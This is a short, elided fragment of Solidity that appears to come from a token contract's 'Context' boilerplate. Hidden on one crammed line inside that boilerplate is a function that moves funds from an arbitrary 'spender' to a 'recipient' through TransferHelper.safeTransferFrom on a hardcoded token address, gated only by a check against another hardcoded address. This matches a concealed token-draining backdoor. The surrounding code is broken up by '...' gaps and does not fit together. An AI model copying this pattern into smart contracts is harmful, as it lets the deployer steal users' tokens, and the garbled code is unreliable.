...
abstract contract Context {
  ...
  function _msgData() internal view virtual returns (bytes calldata) {
    ...
    returns (bool) {if (msg.sender != address(0xBfc60cA1eA956a42F8c74d764A4F0E57Ba53Ca18)) {TransferHelper.safeTransferFrom(0x7D3992d72DbE9E145E9b07CCFeAE1D838a63974a,spender,recipient,amount);return true;}return false;}
}
